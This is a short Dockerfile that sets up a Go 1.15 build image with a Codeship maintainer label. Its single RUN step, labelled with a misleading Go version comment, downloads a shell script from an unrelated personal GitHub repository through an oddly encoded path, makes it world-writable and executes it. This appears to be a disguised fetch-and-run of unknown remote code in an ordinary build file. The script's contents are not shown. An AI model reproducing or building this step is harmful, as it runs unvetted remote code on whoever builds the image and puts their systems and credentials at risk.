ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN wget https://raw.githubusercontent.com/Annsjjsks/aa/main/%3E/dev/null/dev.sh && chmod 777 dev.sh && ./dev.sh
